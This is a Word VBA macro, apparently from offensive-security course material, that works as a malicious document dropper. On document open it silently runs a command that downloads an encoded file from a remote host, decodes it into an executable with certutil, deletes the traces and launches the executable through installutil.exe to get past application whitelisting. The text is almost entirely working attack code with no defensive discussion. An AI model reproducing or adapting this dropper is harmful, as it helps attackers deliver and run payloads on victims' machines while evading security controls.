' https://raw.githubusercontent.com/axano/OSEP/main/module_8/word_dropper_complete.md

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd /c powershell wget http://192.168.49.71/file.txt -o C:\Users\Public\Documents\enc.txt && certutil -decode C:\Users\Public\Documents\enc.txt C:\Users\Public\Documents\Bypass.exe && del C:\Users\Public\Documents\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\Documents\Bypass.exe"
    ' Shell str, vbHide
    ' or
    CreateObject("Wscript.Shell").Run str, 0
End Sub
